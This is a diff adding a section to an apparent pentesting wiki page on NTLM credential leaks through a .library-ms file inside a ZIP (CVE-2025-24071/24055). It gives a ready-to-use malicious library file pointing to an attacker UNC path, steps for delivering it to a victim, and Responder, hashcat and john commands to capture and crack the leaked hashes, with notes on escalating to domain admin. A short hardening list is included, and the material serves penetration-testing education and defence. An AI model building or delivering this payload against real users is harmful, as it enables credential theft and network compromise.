@@ -160,6 +160,74 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
+### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)
+
+Windows Explorer insecurely handles .library-ms files when they are opened directly from within a ZIP archive. If the library definition points to a remote UNC path (e.g., \\attacker\share), simply browsing/launching the .library-ms inside the ZIP causes Explorer to enumerate the UNC and emit NTLM authentication to the attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.
+
+Minimal .library-ms pointing to an attacker UNC
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <version>6</version>
+  <name>Company Documents</name>
+  <isLibraryPinned>false</isLibraryPinned>
+  <iconReference>shell32.dll,-235</iconReference>
+  <templateInfo>
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <simpleLocation>
+        <url>\\10.10.14.2\share</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+Operational steps
+- Create the .library-ms file with the XML above (set your IP/hostname).
+- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
+- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.
+
+Capture NetNTLMv2
+
+```bash
+# Common options: -I <iface> -wrf to capture creds and analyze
+sudo responder -I tun0 -wrf -v
+```
+
+Crack the hash
+
+```bash
+# Hashcat NetNTLMv2 mode
+hashcat -m 5600 netntlmv2.txt /path/to/wordlist -O --force
+
+# Or with John
+john --format=netntlmv2 --wordlist=/path/to/wordlist netntlmv2.txt
+```
+
+Notes
+- Relay vs. crack: SMB signing often prevents SMB relays; however HTTP-based relays (e.g., to AD CS web endpoints) may still be possible depending on hardening. See ESC8 and AD CS pages for details.
+- If credentials are cracked and BloodHound shows AD object control (e.g., GenericWrite) over another principal, you can pivot immediately. See the ACL abuse page below.
+- If AD CS is present and vulnerable to ESC16, you can escalate to privileged identities by requesting authentication-capable certificates and using Pass-the-Certificate/PKINIT.
+
+Hardening/detection
+- Block outbound SMB/445 to untrusted networks; prefer Kerberos over NTLM or disable NTLM where possible.
+- Respect Mark-of-the-Web for ZIP content and treat ZIP-contained shell links/libraries as Internet Zone.
+- Alert on unsolid SMB egress and NTLMv2 challenge/response patterns to external IPs.
+
+Related techniques
+
+{{#ref}}
+../../windows-hardening/active-directory-methodology/acl-persistence-abuse/README.md
+{{#endref}}
+
+{{#ref}}
+../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+{{#endref}}
+
 ### NTLM Relay
 
 Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
@@ -228,5 +296,6 @@ Check the page about **places to steal NTLM creds**:
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
 
 {{#include ../../banners/hacktricks-training.md}}
